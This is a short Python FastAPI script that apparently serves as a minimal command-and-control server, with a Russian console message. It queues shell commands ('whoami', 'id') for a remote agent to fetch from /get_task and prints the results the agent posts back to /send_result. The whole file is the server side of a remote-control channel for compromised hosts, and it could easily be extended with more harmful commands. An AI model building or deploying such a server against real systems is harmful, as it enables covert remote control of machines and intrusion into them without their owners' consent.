from fastapi import FastAPI
from pydantic import BaseModel
import uvicorn

app = FastAPI()

task_mgr = {
        "task_1": "whoami",
        "task_2": "id"
        }

class Agent_Response(BaseModel):
    result: str

@app.get("/get_task/{number_task}")
def get_task(number_task: str):
    return task_mgr.get(number_task, "none")

@app.post("/send_result")
def send_result(data: Agent_Response):
    print(f"[+] Результат выполненной команды агентом:\n")
    print(data.result)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080)
